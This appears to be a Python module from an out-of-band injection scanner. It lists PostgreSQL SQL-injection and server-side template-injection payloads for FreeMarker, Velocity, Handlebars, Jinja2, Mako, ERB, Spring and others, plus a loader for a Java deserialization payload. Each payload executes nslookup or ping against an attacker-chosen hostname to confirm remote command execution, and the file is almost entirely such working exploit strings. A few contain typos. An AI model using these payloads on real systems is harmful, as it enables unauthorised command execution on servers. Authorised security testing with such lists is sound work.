import base64

sqli_payloads = ["';copy (SELECT '') to program 'nslookup  HOSTNAME_VARIABLE'; --", ";copy (SELECT '') to program 'nslookup  HOSTNAME_VARIABLE'; --", "\";copy (SELECT '') to program 'nslookup  HOSTNAME_VARIABLE'; --", "1 = 1;copy (SELECT '') to program 'nslookup  HOSTNAME_VARIABLE'; --",
                 "1;copy (SELECT '') to program 'nslookup  HOSTNAME_VARIABLE'; --"]
ssti_payloads = [
    '{"".getClass().forName("java.net.InetAddress").getMethod("getByName","".getClass()).invoke("","HOSTNAME_VARIABLE")}', '${request.getAttribute("c").add("ping -w 5 HOSTNAME_VARIABLE")}',
    '${request.getAttribute("c").add("nslookup HOSTNAME_VARIABLE")}', '<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("nslookup HOSTNAME_VARIABLE")}',
    "[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('nslookup HOSTNAME_VARIABLE')}", '${"freemarker.template.utility.Execute"?new()("nslookup HOSTNAME_VARIABLE")}',
    '#{"freemarker.template.utility.Execute"?new()("nslookup HOSTNAME_VARIABLE")}',
    '[="freemarker.template.utility.Execute"?new()("nslookup HOSTNAME_VARIABLE")]',
    '<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("ping -w 5 HOSTNAME_VARIABLE")}',
    "[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('ping -w 5 HOSTNAME_VARIABLE')}",
    '${"freemarker.template.utility.Execute"?new()("ping -w 5 HOSTNAME_VARIABLE")}',
    '#{"freemarker.template.utility.Execute"?new()("ping -w 5 HOSTNAME_VARIABLE")}',
    '[="freemarker.template.utility.Execute"?new()("ping -w 5 HOSTNAME_VARIABLE")]',
    '${"ping -w 5 HOSTNAME_VARIABLE".exec()}',
    '${"ping -w 5 HOSTNAME_VARIABLE".execute()}',
    '${new org.codehaus.groovy.runtime.MethodClosure("ping -w 5 HOSTNAME_VARIABLE","execute").call()}',
    '${new org.codehaus.groovy.runtime.MethodClosure("nslookup HOSTNAME_VARIABLE","execute").call()}',
    '${"nslookup HOSTNAME_VARIABLE".exec()}',
    '${"nslookup HOSTNAME_VARIABLE".execute()}',
    """
    {{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('nslookup HOSTNAME_VARIABLE');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
    """,
    """
    {{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('ping -w 5 HOSTNAME_VARIABLE');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
    """,
    "{{#with ""s"" as |string|}} {{#with ""e""}} {{#with split as |conslist|}} {{this.pop}} {{this.push (lookup string.sub ""constructor"")}} {{this.pop}} {{#with string.split as |codelist|}} {{this.pop}} {{this.push ""return require('child_process').execSync('ping -w 5 HOSTNAME_VARIABLE');""}} {{this.pop}} {{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}} {{/with}}",
    "{{#with ""s"" as |string|}} {{#with ""e""}} {{#with split as |conslist|}} {{this.pop}} {{this.push (lookup string.sub ""constructor"")}} {{this.pop}} {{#with string.split as |codelist|}} {{this.pop}} {{this.push ""return require('child_process').execSync('nslookup HOSTNAME_VARIABLE');""}} {{this.pop}} {{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}} {{/with}}",
    "#{root.process.mainModule.require('child_process').spawnSync('nslookup', ['HOSTNAME_VARIABLE']).stdout}",
    "#{root.process.mainModule.require('child_process').spawnSync('ping', ['HOSTNAME_VARIABLE']).stdout}",
    "${T(java.lang.Runtime).getRuntime().exec('nslookup HOSTNAME_VARIABLE')}",
    "${T(java.lang.Runtime).getRuntime().exec('ping -w 5 HOSTNAME_VARIABLE')}",
    "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('ping -w 5 HOSTNAME_VARIABLE').getInputStream())}",
    "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('nslookup HOSTNAME_VARIABLE').getInputStream())}",
    """
        #set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("ping -w 5 HOSTNAME_VARIABLE "))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end""",
    """
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("nslookup HOSTNAME_VARIABLE "))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
""",
"{{['nslookup\x20HOSTNAME_VARIABLE']|filter('system')}}",
"{{['nslookup$IFSHOSTNAME_VARIABLE']|filter('system')}}",
"{{['ping\x20HOSTNAME_VARIABLE']|filter('system')}}",
"{{['ping$IFSHOSTNAME_VARIABLE']|filter('system')}}",
"{system('nslookup HOSTNAME_VARIABLE')}",
"{system('ping -w 5 HOSTNAME_VARIABLE')}",
"<%= system('ping -w 5 HOSTNAME_VARIABLE') %>",
"<%= `ping -w 5 HOSTNAME_VARIABLE /` %>"
"<%= IO.popen('ping -w 5 HOSTNAME_VARIABLE /').readlines()  %>",
"<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('ping -w 5 HOSTNAME_VARIABLE') %><%= @b.readline()%>",
"<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('ping -w 5 HOSTNAME_VARIABLE') %><%= @c.readline()%>",
"<%= system('nslookup HOSTNAME_VARIABLE') %>",
"<%= `nslookup HOSTNAME_VARIABLE /` %>",
"<%= IO.popen('nslookup HOSTNAME_VARIABLE /').readlines()  %>",
"<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('nslookup HOSTNAME_VARIABLE') %><%= @b.readline()%>",
"<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('nslookup HOSTNAME_VARIABLE') %><%= @c.readline()%>",
"""
{% set cmd = 'nslookup HOSTNAME_VARIABLE' %}
{% set bytes = (1).TYPE
     .forName('java.lang.Runtime')
     .methods[6]
     .invoke(null,null)
     .exec(cmd)
     .inputStream
     .readAllBytes() %}
""",
"""
{% set cmd = 'ping HOSTNAME_VARIABLE' %}
{% set bytes = (1).TYPE
     .forName('java.lang.Runtime')
     .methods[6]
     .invoke(null,null)
     .exec(cmd)
     .inputStream
     .readAllBytes() %}
""",
'${self.module.cache.util.os.system("ping HOSTNAME_VARIABLE")}',
'${self.context._with_template.module.runtime.util.os.system("ping HOSTNAME_VARIABLE")}',
'${self.module.cache.util.compat.inspect.linecache.os.system("ping HOSTNAME_VARIABLE")}',
'${self.template.module.runtime.util.compat.inspect.os.system("ping HOSTNAME_VARIABLE")}',
'${self.module.runtime.util.compat.inspect.linecache.os.system("ping HOSTNAME_VARIABLE")}',
'${self.module.runtime.exceptions.traceback.linecache.os.system("ping HOSTNAME_VARIABLE")}',
'${self.module.runtime.exceptions.util.compat.inspect.os.system("ping HOSTNAME_VARIABLE")}',
'${self.template._mmarker.module.cache.compat.inspect.os.system("ping HOSTNAME_VARIABLE")}',
'${self.template.module.cache.compat.inspect.linecache.os.system("ping HOSTNAME_VARIABLE")}',
'${self.attr._NSAttr__parent.template.module.cache.util.os.system("ping HOSTNAME_VARIABLE")}',
'${self.template._mmarker.module.filters.compat.inspect.os.system("ping HOSTNAME_VARIABLE")}',
'${self.template._mmarker.module.runtime.compat.inspect.os.system("ping HOSTNAME_VARIABLE")}',
'${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system("ping HOSTNAME_VARIABLE")}',
'${self.template._mmarker.module.runtime.exceptions.util.os.system("ping HOSTNAME_VARIABLE")}',
'${self.template.module.filters.compat.inspect.linecache.os.system("ping HOSTNAME_VARIABLE")}',
'${self.template.module.runtime.compat.inspect.linecache.os.system("ping HOSTNAME_VARIABLE")}',
'${self.attr._NSAttr__parent.template.module.runtime.util.os.system("ping HOSTNAME_VARIABLE")}',
'${self.context._with_template._mmarker.module.cache.util.os.system("ping HOSTNAME_VARIABLE")}',
'${self.template.module.runtime.exceptions.compat.inspect.os.system("ping HOSTNAME_VARIABLE")}',
'${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system("ping HOSTNAME_VARIABLE")}',
'${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system("ping HOSTNAME_VARIABLE")}',
'${self.context._with_template.module.cache.compat.inspect.os.system("ping HOSTNAME_VARIABLE")}',
'${self.module.runtime.exceptions.compat.inspect.linecache.os.system("ping HOSTNAME_VARIABLE")}',
'${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system("ping HOSTNAME_VARIABLE")}',
'${self.context._with_template._mmarker.module.runtime.util.os.system("ping HOSTNAME_VARIABLE")}',
'${self.context._with_template.module.filters.compat.inspect.os.system("ping HOSTNAME_VARIABLE")}',
'${self.context._with_template.module.runtime.compat.inspect.os.system("ping HOSTNAME_VARIABLE")}',
'${self.context._with_template.module.runtime.exceptions.util.os.system("ping HOSTNAME_VARIABLE")}',
'${self.template.module.runtime.exceptions.traceback.linecache.os.system("ping HOSTNAME_VARIABLE")}',
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"ping HOSTNAME_VARIABLE\\\"); x.start()\")}}",
"{{ cycler.__init__.__globals__.os.popen('nslookup HOSTNAME_VARIABLE').read() }}",
"{{ joiner.__init__.__globals__.os.popen('ping HOSTNMANE_VARIABLE').read() }}",
"{{ namespace.__init__.__globals__.os.popen('ping HOSTNMANE_VARIABLE').read() }}",
]
deserial_payloads = ["utils/deserial_java/payload"]


def get_payloads(scan_option, hostname):
    if scan_option == 'deserial':
        data = open(deserial_payloads[0], "r").read()
        return [base64.b64encode(data)]
    return [sub.replace('HOSTNAME_VARIABLE', hostname) for sub in globals()[f'{scan_option}_payloads']]
